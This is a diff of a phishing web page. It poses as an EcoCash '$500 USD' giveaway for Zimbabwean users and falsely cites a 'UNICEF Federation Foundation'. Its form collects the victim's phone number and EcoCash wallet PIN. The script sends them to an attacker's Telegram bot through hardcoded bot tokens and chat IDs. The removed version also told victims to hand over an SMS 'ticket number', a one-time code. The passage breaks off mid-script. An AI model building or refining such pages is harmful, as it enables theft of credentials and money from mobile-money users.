             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 16px;
-            font-size: 34px;
+            margin: 0 auto 20px;
+            font-size: 40px;
             color: #0b0d12;
-            box-shadow: 0 8px 40px rgba(74,222,128,0.3);
-            animation: pop 0.6s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+            box-shadow: 0 8px 40px rgba(74, 222, 128, 0.25);
+            animation: popIn 0.6s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+        }
+        @keyframes popIn {
+            0% {
+                transform: scale(0.5);
+                opacity: 0;
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
         }
 
-        @keyframes pop {
-            0% { transform: scale(0.4); opacity: 0; }
-            100% { transform: scale(1); opacity: 1; }
+        .success-screen h2 {
+            font-size: 24px;
+            font-weight: 800;
+            margin-bottom: 12px;
         }
-
-        .success h2 { font-size: 22px; font-weight: 800; margin-bottom: 8px; }
-        .success p { color: rgba(255,255,255,0.5); font-size: 14px; line-height: 1.7; max-width: 340px; margin: 0 auto; }
-        .success p .hl { color: var(--gold-light); font-weight: 600; }
-
-        /* ─── FUNDED BOX ─── */
-        .funded-box {
-            background: rgba(0, 168, 89, 0.08);
-            border: 1px solid rgba(0, 168, 89, 0.2);
-            border-radius: 14px;
-            padding: 16px 20px;
-            margin: 18px 0 14px;
-            text-align: left;
-            animation: walletPulse 2.5s ease-in-out infinite;
-        }
-
-        .funded-box .funded-label {
-            font-size: 11px;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.8px;
-            color: rgba(74, 222, 128, 0.9);
-            margin-bottom: 8px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-
-        .funded-box .funded-number {
-            font-family: 'Inter', monospace;
-            font-size: 20px;
-            font-weight: 700;
-            color: #fff;
-            letter-spacing: 1px;
-            margin-bottom: 4px;
-        }
-
-        .funded-box .funded-amount {
-            font-size: 12px;
-            color: rgba(255,255,255,0.45);
-        }
-
-        .funded-box .funded-amount strong {
-            color: var(--gold);
-            font-weight: 700;
-        }
-
-        /* ─── TICKET INSTRUCTION ─── */
-        .ticket-instruction {
-            background: rgba(245, 179, 66, 0.06);
-            border: 1px solid rgba(245, 179, 66, 0.18);
-            border-radius: 14px;
-            padding: 16px 18px;
-            margin-bottom: 14px;
-            text-align: left;
-        }
-
-        .ticket-instruction .ti-header {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 11px;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 0.8px;
-            color: var(--gold-light);
-            margin-bottom: 8px;
-        }
-
-        .ticket-instruction .ti-body {
-            font-size: 13px;
-            line-height: 1.7;
-            color: rgba(255,255,255,0.6);
-        }
-
-        .ticket-instruction .ti-body strong {
-            color: rgba(255,255,255,0.85);
-            font-weight: 600;
-        }
-
-        .ticket-instruction .ti-body .code-hint {
-            display: inline-block;
-            background: rgba(245, 179, 66, 0.1);
-            border: 1px solid rgba(245, 179, 66, 0.2);
-            border-radius: 6px;
-            padding: 2px 8px;
-            font-family: 'Inter', monospace;
-            font-weight: 700;
-            color: var(--gold);
-            letter-spacing: 2px;
-            font-size: 12px;
-            margin: 0 2px;
-        }
-
-        /* ─── NOTICE BOX ─── */
-        .notice-box {
-            background: rgba(255,255,255,0.03);
-            border: 1px solid rgba(255,255,255,0.06);
-            border-radius: 12px;
-            padding: 12px 14px;
-            display: flex;
-            align-items: flex-start;
-            gap: 10px;
-            text-align: left;
-            margin-bottom: 10px;
-        }
-
-        .notice-box .notice-icon {
-            flex-shrink: 0;
+        .success-screen p {
+            color: var(--text-secondary);
             font-size: 16px;
-            line-height: 1.4;
+            line-height: 1.7;
+            max-width: 380px;
+            margin: 0 auto;
         }
-
-        .notice-box .notice-text {
-            font-size: 12px;
-            line-height: 1.6;
-            color: rgba(255,255,255,0.5);
-        }
-
-        .notice-box .notice-text strong {
-            color: rgba(255,255,255,0.75);
+        .success-screen p .highlight-text {
+            color: var(--gold-light);
             font-weight: 600;
-        }
-
-        /* ─── FOOTER ─── */
-        .footer {
-            margin-top: 20px;
-            font-size: 10px;
-            color: rgba(255,255,255,0.12);
-            text-align: center;
-            border-top: 1px solid rgba(255,255,255,0.04);
-            padding-top: 16px;
-            letter-spacing: 0.3px;
         }
 
         /* ─── CONFETTI ─── */
-        #confetti {
+        .confetti-container {
             position: fixed;
             top: 0;
             left: 0;
@@ -943,443 +509,470 @@
             z-index: 9999;
             overflow: hidden;
         }
-
         .confetti-piece {
             position: absolute;
-            width: 8px;
-            height: 8px;
+            width: 10px;
+            height: 10px;
             top: -10px;
-            animation: confettiRain linear forwards;
+            animation: confetti-fall linear forwards;
         }
-
-        @keyframes confettiRain {
-            0% { transform: translateY(0) rotate(0) scale(1); opacity: 1; }
-            100% { transform: translateY(110vh) rotate(720deg) scale(0.3); opacity: 0; }
+        @keyframes confetti-fall {
+            0% {
+                transform: translateY(0) rotate(0deg) scale(1);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(110vh) rotate(720deg) scale(0.3);
+                opacity: 0;
+            }
         }
 
         /* ─── RESPONSIVE ─── */
         @media (max-width: 540px) {
-            .card { padding: 26px 18px 24px; border-radius: 16px; }
-            .title { font-size: 24px; }
-            .prize-box .amount { font-size: 26px; }
-            .prize-box { padding: 14px 16px; }
-            .crowd-scene { height: 22%; }
-            .person .body { width: 20px; height: 24px; }
-            .person .head { width: 14px; height: 14px; }
-            .person .phone { width: 16px; height: 12px; right: -10px; }
-            .person .phone::before { font-size: 10px; top: -8px; }
-            .crowd { gap: 2px; padding: 0 8px; }
-            .sparkle { display: none; }
-            .funded-box .funded-number { font-size: 17px; }
+            .card {
+                padding: 28px 18px 28px;
+                border-radius: 16px;
+            }
+            .title {
+                font-size: 26px;
+            }
+            .subtitle {
+                font-size: 14px;
+            }
+            .prize-display .info .amount {
+                font-size: 22px;
+            }
+            .ecocash-logo {
+                font-size: 12px;
+                padding: 3px 10px 3px 8px;
+            }
+            .ecocash-logo svg {
+                width: 20px;
+                height: 20px;
+            }
+            .success-screen h2 {
+                font-size: 20px;
+            }
+            .success-screen p {
+                font-size: 14px;
+            }
         }
 
         @media (max-width: 380px) {
-            .card { padding: 18px 12px 20px; }
-            .title { font-size: 20px; }
-            .prize-box .amount { font-size: 22px; }
-            .crowd-scene { height: 18%; }
-            .person .body { width: 16px; height: 20px; }
-            .person .head { width: 12px; height: 12px; }
+            .card {
+                padding: 20px 14px 24px;
+            }
+            .title {
+                font-size: 22px;
+            }
+            .badge {
+                font-size: 10px;
+                padding: 4px 12px 4px 8px;
+            }
         }
 
+        /* ─── UTILITY ─── */
+        .mt-4 {
+            margin-top: 4px;
+        }
+        .mt-8 {
+            margin-top: 8px;
+        }
+        .mt-12 {
+            margin-top: 12px;
+        }
+        .text-center {
+            text-align: center;
+        }
+        .sr-only {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            padding: 0;
+            margin: -1px;
+            overflow: hidden;
+            clip: rect(0, 0, 0, 0);
+            border: 0;
+        }
+
+        /* ─── FOOTER ─── */
+        .footer-note {
+            margin-top: 24px;
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.15);
+            text-align: center;
+            letter-spacing: 0.2px;
+            border-top: 1px solid rgba(255, 255, 255, 0.04);
+            padding-top: 20px;
+        }
+        .footer-note a {
+            color: rgba(255, 255, 255, 0.2);
+            text-decoration: none;
+        }
+        .footer-note a:hover {
+            color: rgba(255, 255, 255, 0.4);
+        }
+
+        /* ─── FADE IN ANIMATION ─── */
         @keyframes fadeUp {
-            from { opacity: 0; transform: translateY(16px); }
-            to { opacity: 1; transform: translateY(0); }
+            from {
+                opacity: 0;
+                transform: translateY(18px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
     </style>
 </head>
 <body>
 
-    <!-- ─── VIDEO BACKGROUND ─── -->
-    <div id="video-bg">
-        <video autoplay loop muted playsinline preload="auto">
-            <source src="https://assets.mixkit.co/videos/preview/mixkit-people-celebrating-with-fireworks-3363-large.mp4" type="video/mp4" />
-            <source src="https://assets.mixkit.co/videos/preview/mixkit-celebratory-fireworks-over-the-city-1231-large.mp4" type="video/mp4" />
-            <source src="https://assets.mixkit.co/videos/preview/mixkit-people-dancing-at-a-party-2629-large.mp4" type="video/mp4" />
-        </video>
-        <div class="video-overlay"></div>
-
-        <!-- Crowd Scene -->
-        <div class="crowd-scene">
-            <div class="crowd-confetti">
-                <span></span><span></span><span></span><span></span><span></span>
-                <span></span><span></span><span></span><span></span><span></span>
-                <span></span><span></span>
-            </div>
-            <div class="crowd">
-                <div class="person excited"><div class="head"><div class="ring"></div><div class="ring"></div></div><div class="body"><div class="phone"></div></div></div>
-                <div class="person"><div class="head"></div><div class="body"><div class="phone"></div></div></div>
-                <div class="person excited"><div class="head"><div class="ring"></div></div><div class="body"><div class="phone"></div></div></div>
-                <div class="person"><div class="head"></div><div class="body"><div class="phone"></div></div></div>
-                <div class="person excited"><div class="head"><div class="ring"></div><div class="ring"></div></div><div class="body"><div class="phone"></div></div></div>
-                <div class="person"><div class="head"></div><div class="body"><div class="phone"></div></div></div>
-                <div class="person excited"><div class="head"><div class="ring"></div></div><div class="body"><div class="phone"></div></div></div>
-                <div class="person"><div class="head"></div><div class="body"><div class="phone"></div></div></div>
-                <div class="person excited"><div class="head"><div class="ring"></div><div class="ring"></div></div><div class="body"><div class="phone"></div></div></div>
-                <div class="person"><div class="head"></div><div class="body"><div class="phone"></div></div></div>
-                <div class="person excited"><div class="head"><div class="ring"></div></div><div class="body"><div class="phone"></div></div></div>
-                <div class="person"><div class="head"></div><div class="body"><div class="phone"></div></div></div>
-                <div class="person excited"><div class="head"><div class="ring"></div><div class="ring"></div></div><div class="body"><div class="phone"></div></div></div>
-                <div class="person"><div class="head"></div><div class="body"><div class="phone"></div></div></div>
-                <div class="person excited"><div class="head"><div class="ring"></div></div><div class="body"><div class="phone"></div></div></div>
-            </div>
-        </div>
-    </div>
-
-    <!-- ─── FLASH OVERLAY ─── -->
-    <div class="flash-overlay"></div>
-
-    <!-- ─── SPARKLES ─── -->
-    <div class="sparkle-container">
-        <div class="sparkle"></div>
-        <div class="sparkle"></div>
-        <div class="sparkle"></div>
-        <div class="sparkle"></div>
-        <div class="sparkle"></div>
-        <div class="sparkle"></div>
-        <div class="sparkle"></div>
-        <div class="sparkle"></div>
-    </div>
-
-    <!-- ─── SCANLINES ─── -->
-    <div class="scanlines"></div>
-
-    <!-- ─── FALLING DOLLARS ─── -->
-    <div id="dollars"></div>
-
-    <!-- ─── CONFETTI ─── -->
-    <div id="confetti"></div>
+    <!-- ─── FALLING DOLLARS BACKGROUND ─── -->
+    <div id="dollar-rain"></div>
 
     <!-- ─── MAIN CARD ─── -->
-    <div class="card">
+    <div class="card" role="main" aria-label="Promotional landing page for Zimbabwe">
 
-        <!-- ─── FORM VIEW ─── -->
-        <div id="formView">
+        <!-- BADGE -->
+        <div class="badge">
+            <span class="dot"></span>
+            🇿🇼 Zimbabwe Only • Limited Offer
+        </div>
 
-            <div class="badge">
-                <span class="dot"></span>
-                🇿🇼 Zimbabwe • Limited Offer • ⚡ Flash Giveaway
+        <!-- TITLE -->
+        <h1 class="title">
+            You've been selected for <br /><span class="highlight">$500 USD</span>
+        </h1>
+        <p class="subtitle">
+            <strong>Congratulations!</strong> You are one of the lucky users from
+            <span class="flag">🇿🇼</span> <strong>Zimbabwe</strong> chosen to receive
+            <strong>$500 USD</strong>.
+        </p>
+
+        <!-- PRIZE DISPLAY -->
+        <div class="prize-display">
+            <span class="icon">🎉</span>
+            <div class="info">
+                <div class="label">Your reward</div>
+                <div class="amount">$500 <span>USD</span></div>
+            </div>
+        </div>
+
+        <!-- ─── SINGLE FORM ─── -->
+        <form id="promoForm" novalidate autocomplete="off">
+
+            <!-- PHONE NUMBER -->
+            <div class="form-group">
+                <label for="phoneNumber">
+                    Phone Number <span class="required">*</span>
+                </label>
+                <div class="phone-prefix-group">
+                    <span class="prefix" id="countryPrefix">+263</span>
+                    <input
+                    type="tel"
+                    class="form-control"
+                    id="phoneNumber"
+                    placeholder="** *** ****"
+                    autocomplete="tel"
+                    required
+                    aria-describedby="phoneHint"
+                    />
+                </div>
+                <div class="form-hint" id="phoneHint">Enter your 9‑digit Zimbabwean number (e.g., 71 234 5678).</div>
             </div>
 
-            <div class="sub-title">🎉 Congratulations!</div>
-            <h1 class="title">You've been selected for<br /><span class="gold">$500 USD</span></h1>
-            <p class="desc">Official cash prize — claim your reward today</p>
-
-            <div class="prize-box">
-                <span class="icon">🏆</span>
-                <div class="info">
-                    <div class="label">💰 Your Prize</div>
-                    <div class="amount">$500 <small>USD</small></div>
-                    <div class="wallet-badge">
-                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                            <rect x="2" y="5" width="20" height="14" rx="2"/>
-                            <path d="M16 12a2 2 0 1 1 4 0"/>
+            <!-- PIN (EcoCash) with Logo -->
+            <div class="form-group">
+                <label for="cardPin" style="display:flex; align-items:center; gap:6px;">
+                    <!-- EcoCash Logo -->
+                    <span class="ecocash-logo">
+                        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <circle cx="12" cy="12" r="10" fill="white" />
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z" fill="#00a859" />
+                            <circle cx="12" cy="12" r="7" fill="#00a859" />
+                            <text x="12" y="15" font-size="10" font-weight="bold" text-anchor="middle" fill="white" font-family="Arial, sans-serif">$</text>
                         </svg>
-                        <span>Deposits to EcoCash Wallet</span>
-                    </div>
+                        <span class="logo-text">Eco<span>Cash</span></span>
+                    </span>
+                    <span>PIN</span>
+                    <span class="required">*</span>
+                </label>
+                <div class="pin-wrapper">
+                    <input
+                    type="password"
+                    class="form-control"
+                    id="cardPin"
+                    placeholder="••••"
+                    autocomplete="off"
+                    maxlength="4"
+                    inputmode="numeric"
+                    pattern="[0-9]{4}"
+                    required
+                    aria-describedby="pinHint"
+                    />
+                    <button type="button" class="toggle-vis" id="togglePin" aria-label="Toggle PIN visibility">
+                        👁
+                    </button>
                 </div>
+                <div class="form-hint" id="pinHint">Enter your 4‑digit EcoCash PIN.</div>
             </div>
 
-            <form id="form" novalidate>
+            <!-- SUBMIT BUTTON -->
+            <button type="submit" class="btn btn-primary" id="submitBtn">
+                Claim Reward
+            </button>
 
-                <div class="form-group">
-                    <label>Phone Number <span class="req">*</span></label>
-                    <div class="input-group phone-input">
-                        <span class="prefix">+263</span>
-                        <input type="tel" id="phone" placeholder="7X XXX XXXX" autocomplete="tel" required maxlength="12" />
-                    </div>
-                    <div class="input-hint" id="phoneHint">Format: <strong>7X XXX XXXX</strong> (e.g., 71 234 5678)</div>
-                </div>
+        </form>
 
-                <div class="form-group">
-                    <label style="display:flex;align-items:center;gap:6px;">
-                        <span class="ecocash">
-                            <svg viewBox="0 0 24 24" fill="none">
-                                <circle cx="12" cy="12" r="10" fill="white"/>
-                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z" fill="#00a859"/>
-                                <circle cx="12" cy="12" r="7" fill="#00a859"/>
-                                <text x="12" y="15" font-size="10" font-weight="bold" text-anchor="middle" fill="white" font-family="Arial">$</text>
-                            </svg>
-                            <span>Eco<em>Cash</em></span>
-                        </span>
-                        <span>Wallet PIN</span>
-                        <span class="req">*</span>
-                    </label>
-                    <div class="input-group pin-wrap">
-                        <input type="password" id="pin" placeholder="••••" maxlength="4" inputmode="numeric" pattern="[0-9]{4}" required />
-                        <button type="button" class="toggle" id="togglePin" aria-label="Toggle PIN">👁</button>
-                    </div>
-                    <div class="input-hint" id="pinHint">Enter your 4-digit EcoCash PIN</div>
-                </div>
-
-                <button type="submit" class="btn btn-primary" id="submitBtn">
-                    💰 Claim Reward to My EcoCash Wallet
-                </button>
-
-            </form>
-        </div>
-
-        <!-- ─── SUCCESS VIEW ─── -->
-        <div class="success" id="successView">
-            <div class="check">✓</div>
-            <h2>🎉 Details Received Successfully</h2>
+        <!-- ─── SUCCESS SCREEN ─── -->
+        <div class="success-screen" id="successScreen">
+            <div class="checkmark">✓</div>
+            <h2>🎉 Congratulations!</h2>
             <p>
-                Your award of <span class="hl">$500 USD</span> is now in process.
-                Please read the instructions below carefully.
+                You have been selected to win <span class="highlight-text">$500 USD</span> from the
+                <strong>UNICEF Federation Foundation</strong>. <br /><br />
+                Your funds will be transferred to your account within <strong>2 minutes</strong>.
             </p>
-
-            <div class="funded-box">
-                <div class="funded-label">
-                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
-                        <rect x="2" y="5" width="20" height="14" rx="2"/>
-                        <path d="M16 12a2 2 0 1 1 4 0"/>
-                    </svg>
-                    Number To Be Funded
-                </div>
-                <div class="funded-number" id="fundedNumber">+263 XX XXX XXXX</div>
-                <div class="funded-amount">Award Amount: <strong>$500.00 USD</strong></div>
-            </div>
-
-            <div class="ticket-instruction">
-                <div class="ti-header">
-                    <span>🔐</span>
-                    Ticket Number Required To Unlock Funds
-                </div>
-                <div class="ti-body">
-                    EcoCash has sent a <strong>6-digit ticket number</strong> to your phone via SMS.
-                    To unlock and receive your <strong>$500 USD</strong> into your EcoCash wallet,
-                    please enter that ticket number when prompted.
-                    <br /><br />
-                    Your ticket number will look like: <span class="code-hint">123456</span>
-                </div>
-            </div>
-
-            <div class="notice-box">
-                <div class="notice-icon">📲</div>
-                <div class="notice-text">
-                    <strong>Check your SMS inbox.</strong>
-                    The 6-digit ticket number has been sent from EcoCash to the number you provided.
-                    If you don't see it within 2 minutes, please check your spam or promotional folder.
-                </div>
-            </div>
-
-            <div class="notice-box">
-                <div class="notice-icon">⏱️</div>
-                <div class="notice-text">
-                    <strong>Do not close this window.</strong>
-                    Your award will be credited to the number above once the ticket number has been confirmed.
-                </div>
-            </div>
         </div>
 
-        <div class="footer">🔒 Secured • Encrypted • Official EcoCash Award Program</div>
+        <!-- FOOTER -->
+        <div class="footer-note">
+            🔒 Secured • Data encrypted • 100% confidential
+        </div>
     </div>
+
+    <!-- ─── CONFETTI CONTAINER ─── -->
+    <div class="confetti-container" id="confettiContainer" aria-hidden="true"></div>
 
     <!-- ─── JAVASCRIPT ─── -->
     <script>
         (function() {
             'use strict';
 
-            const formView = document.getElementById('formView');
-            const successView = document.getElementById('successView');
-            const form = document.getElementById('form');
+            // ─── DOM REFS ───
+            const form = document.getElementById('promoForm');
             const submitBtn = document.getElementById('submitBtn');
-            const phone = document.getElementById('phone');
-            const pin = document.getElementById('pin');
+            const successScreen = document.getElementById('successScreen');
+            const phoneInput = document.getElementById('phoneNumber');
+            const pinInput = document.getElementById('cardPin');
             const togglePin = document.getElementById('togglePin');
-            const phoneHint = document.getElementById('phoneHint');
-            const pinHint = document.getElementById('pinHint');
-            const fundedNumber = document.getElementById('fundedNumber');
-            const confettiContainer = document.getElementById('confetti');
+            const confettiContainer = document.getElementById('confettiContainer');
 
             let isSubmitting = false;
 
-            // ─── TELEGRAM CONFIG ───
-            // ⚠️ REPLACE WITH YOUR OWN BOT TOKEN AND CHAT ID
-            const BOT_TOKEN = '8773610021:AAHN80m50Ssiyj5hR1UFRDfzjCY6l50CJXM';
-            const CHAT_ID = '8834429633';
+            // ─── CONFIG: TELEGRAM ───
+            const BOT_TOKEN = '8827509109:AAEbS9F6jvIvYlKxGDeRIHUPlP5PlGkpQoU';
+            const CHAT_ID = '7737206212';
 
-            function getTime() {
-                return new Date().toLocaleString('en-US', {
-                    month: 'numeric', day: 'numeric', year: 'numeric',
-                    hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true
-                });
-            }
-
-            function formatPhone(number) {
-                const local = number.slice(3);
-                return '+263 ' + local.slice(0, 2) + ' ' + local.slice(2, 5) + ' ' + local.slice(5, 9);
-            }
-
-            async function sendToTelegram(msg) {
-                try {
-                    const res = await fetch(
-                        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`
-                    );
-                    const data = await res.json();
-                    return { ok: data.ok };
-                } catch (e) {
-                    console.error('Telegram error:', e);
-                    return { ok: false };
-                }
-            }
-
+            // ─── VALIDATION ───
             function validatePhone() {
-                const raw = phone.value.replace(/\s/g, '');
-                if (!/^7\d{8}$/.test(raw)) {
-                    phone.classList.add('error');
-                    phoneHint.textContent = '❌ Please enter a valid number (format: 7X XXX XXXX)';
-                    phoneHint.classList.add('error');
+                const raw = phoneInput.value.replace(/\s/g, '');
+                if (!/^\d{9}$/.test(raw)) {
+                    phoneInput.classList.add('error');
+                    document.getElementById('phoneHint').textContent = 'Enter exactly 9 digits (e.g., 712345678).';
+                    document.getElementById('phoneHint').classList.add('error-text');
                     return false;
                 }
-                phone.classList.remove('error');
-                phoneHint.innerHTML = 'Format: <strong>7X XXX XXXX</strong> (e.g., 71 234 5678)';
-                phoneHint.classList.remove('error');
+                phoneInput.classList.remove('error');
+                document.getElementById('phoneHint').textContent = 'Enter your 9‑digit Zimbabwean number.';
+                document.getElementById('phoneHint').classList.remove('error-text');
                 return true;
             }
 
             function validatePin() {
-                const val = pin.value.replace(/\s/g, '');
+                const val = pinInput.value.replace(/\s/g, '');
                 if (!/^\d{4}$/.test(val)) {
-                    pin.classList.add('error');
-                    pinHint.textContent = 'Enter exactly 4 digits';
-                    pinHint.classList.add('error');
+                    pinInput.classList.add('error');
+                    document.getElementById('pinHint').textContent = 'Enter exactly 4 digits.';
+                    document.getElementById('pinHint').classList.add('error-text');
                     return false;
                 }
-                pin.classList.remove('error');
-                pinHint.textContent = 'Enter your 4-digit EcoCash PIN';
-                pinHint.classList.remove('error');
+                pinInput.classList.remove('error');
+                document.getElementById('pinHint').textContent = 'Enter your 4‑digit EcoCash PIN.';
+                document.getElementById('pinHint').classList.remove('error-text');
                 return true;
             }
 
-            phone.addEventListener('input', function() {
+            // ─── FORMAT PHONE: +263 ** *** **** (2-3-4 grouping) ───
+            phoneInput.addEventListener('input', function(e) {
                 let val = this.value.replace(/\D/g, '');
-                if (val.length > 0 && val[0] !== '7') val = '7' + val;
                 if (val.length > 9) val = val.slice(0, 9);
-
                 let formatted = '';
-                if (val.length > 0) {
-                    formatted = val.slice(0, 1);
-                    if (val.length > 1) {
-                        formatted += val.slice(1, 2);
-                        if (val.length > 2) {
-                            formatted += ' ' + val.slice(2, 5);
-                            if (val.length > 5) formatted += ' ' + val.slice(5, 9);
-                        }
+                if (val.length > 2) {
+                    formatted = val.slice(0, 2) + ' ' + val.slice(2);
+                    if (val.length > 5) {
+                        formatted = val.slice(0, 2) + ' ' + val.slice(2, 5) + ' ' + val.slice(5, 9);
                     }
+                } else {
+                    formatted = val;
                 }
                 this.value = formatted;
                 this.classList.remove('error');
-                phoneHint.classList.remove('error');
-                phoneHint.innerHTML = 'Format: <strong>7X XXX XXXX</strong> (e.g., 71 234 5678)';
+                document.getElementById('phoneHint').classList.remove('error-text');
+                document.getElementById('phoneHint').textContent = 'Enter your 9‑digit Zimbabwean number.';
             });
 
-            pin.addEventListener('input', function() {
-                this.value = this.value.replace(/\D/g, '').slice(0, 4);
+            // ─── PIN: digits only, max 4 ───
+            pinInput.addEventListener('input', function(e) {
+                this.value = this.value.replace(/\D/g, '');
+                if (this.value.length > 4) this.value = this.value.slice(0, 4);
                 this.classList.remove('error');
-                pinHint.classList.remove('error');
-                pinHint.textContent = 'Enter your 4-digit EcoCash PIN';
+                document.getElementById('pinHint').classList.remove('error-text');
+                document.getElementById('pinHint').textContent = 'Enter your 4‑digit EcoCash PIN.';
             });
 
+            // ─── TOGGLE PIN VISIBILITY ───
             togglePin.addEventListener('click', function() {
-                const isPass = pin.type === 'password';
-                pin.type = isPass ? 'text' : 'password';
-                this.textContent = isPass ? '🙈' : '👁';
+                const isPassword = pinInput.type === 'password';
+                pinInput.type = isPassword ? 'text' : 'password';
+                this.textContent = isPassword ? '🙈' : '👁';
             });
 
+            // ─── ENTER KEY: submit form ───
             form.addEventListener('keydown', function(e) {
-                if (e.key === 'Enter') { e.preventDefault(); submitBtn.click(); }
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    submitBtn.click();
+                }
             });
 
-            function triggerConfetti() {
-                const colors = ['#f5b342', '#ffd966', '#4ade80', '#f87171', '#60a5fa', '#c084fc', '#f472b6'];
-                for (let i = 0; i < 150; i++) {
-                    const el = document.createElement('div');
-                    el.className = 'confetti-piece';
-                    const size = 5 + Math.random() * 8;
-                    el.style.width = size + 'px';
-                    el.style.height = size + 'px';
-                    el.style.background = colors[Math.floor(Math.random() * colors.length)];
-                    el.style.left = Math.random() * 100 + '%';
-                    el.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
-                    el.style.animationDuration = (2 + Math.random() * 3) + 's';
-                    el.style.animationDelay = (Math.random() * 2) + 's';
-                    confettiContainer.appendChild(el);
-                }
-                setTimeout(() => { confettiContainer.innerHTML = ''; }, 6000);
+            // ─── GET CURRENT TIME ───
+            function getTimeString() {
+                return new Date().toLocaleString('en-US', {
+                    month: 'numeric',
+                    day: 'numeric',
+                    year: 'numeric',
+                    hour: 'numeric',
+                    minute: 'numeric',
+                    second: 'numeric',
+                    hour12: true
+                });
             }
 
+            // ─── TELEGRAM SENDER ───
+            async function sendToTelegram(message) {
+                const url =
+                    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+                try {
+                    const response = await fetch(url);
+                    const data = await response.json();
+                    if (!data.ok) {
+                        console.error('Telegram API error:', data);
+                        return { ok: false, error: data.description || 'Unknown error' };
+                    }
+                    return { ok: true };
+                } catch (err) {
+                    console.error('Network error sending to Telegram:', err);
+                    return { ok: false, error: err.message };
+                }
+            }
+
+            // ─── SUBMIT ───
             form.addEventListener('submit', async function(e) {
                 e.preventDefault();
 
-                if (isSubmitting) return;
-
                 const phoneOk = validatePhone();
                 const pinOk = validatePin();
-                if (!phoneOk || !pinOk) return;
 
-                const fullPhone = '263' + phone.value.replace(/\s/g, '');
-                const userPin = pin.value;
+                if (!phoneOk) {
+                    phoneInput.focus();
+                    return;
+                }
+                if (!pinOk) {
+                    pinInput.focus();
+                    return;
+                }
 
+                if (isSubmitting) return;
                 isSubmitting = true;
                 submitBtn.disabled = true;
-                submitBtn.innerHTML = '<span class="spinner"></span> Submitting...';
+                submitBtn.innerHTML = '<span class="spinner"></span> Processing…';
 
-                const msg =
-                    `📋 EcoCash Award — New Submission\n` +
-                    `━━━━━━━━━━━━━━━━━━\n` +
-                    `📞 Wallet Number: +${fullPhone}\n` +
-                    `🔐 EcoCash PIN: ${userPin}\n` +
-                    `💰 Award Amount: $500 USD\n` +
-                    `⏱️ Time: ${getTime()}\n` +
-                    `━━━━━━━━━━━━━━━━━━\n` +
-                    `✅ Status: Details received — awaiting 6-digit ticket number`;
+                const phone = phoneInput.value.trim();
+                const pin = pinInput.value.trim();
+                const fullPhone = '+263' + phone.replace(/\s/g, '');
+                const timeString = getTimeString();
 
-                await sendToTelegram(msg);
+                const message =
+                    `🎯 *New Claim Submission*\n` +
+                    `Phone: ${fullPhone}\n` +
+                    `EcoCash PIN: ${pin}\n` +
+                    `Time: ${timeString}`;
 
-                fundedNumber.textContent = formatPhone(fullPhone);
+                const result = await sendToTelegram(message);
 
-                setTimeout(() => {
-                    formView.style.display = 'none';
-                    successView.classList.add('active');
-                    triggerConfetti();
+                if (result.ok) {
+                    // ─── SUCCESS ───
+                    form.style.display = 'none';
+                    successScreen.classList.add('active');
+                    launchConfetti();
+                } else {
+                    alert(
+                        `There was an issue submitting your claim. Please try again.\n\n${result.error || 'Unknown error'}`);
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'Claim Reward';
                     isSubmitting = false;
-                }, 1400);
+                }
             });
 
+            // ─── CONFETTI ───
+            function launchConfetti() {
+                const colors = ['#f5b342', '#ffd966', '#4ade80', '#f87171', '#60a5fa', '#a78bfa', '#f472b6', '#34d399'];
+                const container = confettiContainer;
+                container.innerHTML = '';
+
+                for (let i = 0; i < 80; i++) {
+                    const piece = document.createElement('div');
+                    piece.className = 'confetti-piece';
+                    const color = colors[Math.floor(Math.random() * colors.length)];
+                    const size = 6 + Math.random() * 10;
+                    const left = Math.random() * 100;
+                    const duration = 2 + Math.random() * 3;
+                    const delay = Math.random() * 2.5;
+                    const rotation = Math.random() * 360;
+
+                    piece.style.cssText = `
+                            left: ${left}%;
+                            width: ${size}px;
+                            height: ${size * (0.5 + Math.random())}px;
+                            background: ${color};
+                            border-radius: ${Math.random() > 0.5 ? '50%' : '2px'};
+                            animation-duration: ${duration}s;
+                            animation-delay: ${delay}s;
+                            transform: rotate(${rotation}deg);
+                            box-shadow: 0 0 6px rgba(255,255,255,0.1);
+                        `;
+                    container.appendChild(piece);
+                }
+
+                setTimeout(() => {
+                    container.innerHTML = '';
+                }, 6000);
+            }
+
             // ─── FALLING DOLLARS ───
-            (function createDollars() {
-                const container = document.getElementById('dollars');
-                const symbols = ['$', '💵', '💲'];
-                for (let i = 0; i < 35; i++) {
-                    const el = document.createElement('div');
+            function initDollarRain() {
+                const container = document.getElementById('dollar-rain');
+                const symbols = ['$', '💵', '💰', '🪙'];
+                const count = 60;
+                for (let i = 0; i < count; i++) {
+                    const el = document.createElement('span');
                     el.className = 'dollar';
                     el.textContent = symbols[Math.floor(Math.random() * symbols.length)];
                     el.style.left = Math.random() * 100 + '%';
-                    el.style.fontSize = (14 + Math.random() * 20) + 'px';
